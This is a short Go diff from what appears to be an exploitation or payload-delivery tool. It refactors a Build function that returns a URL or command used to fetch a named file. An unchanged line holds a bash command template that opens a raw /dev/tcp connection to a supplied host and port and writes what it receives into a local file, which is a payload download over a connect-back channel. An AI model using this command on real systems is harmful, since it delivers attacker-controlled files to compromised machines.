@@ -291,7 +291,7 @@ func Build(config BuildConfig) (string, error) {
 		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
 	}
 
-	return "http://" + DefaultConnectBack + "/" + config.Name, nil
+	return DownloadURL(config.Name), nil
 }
 
 func startBuildManager(_cachePath string) error {
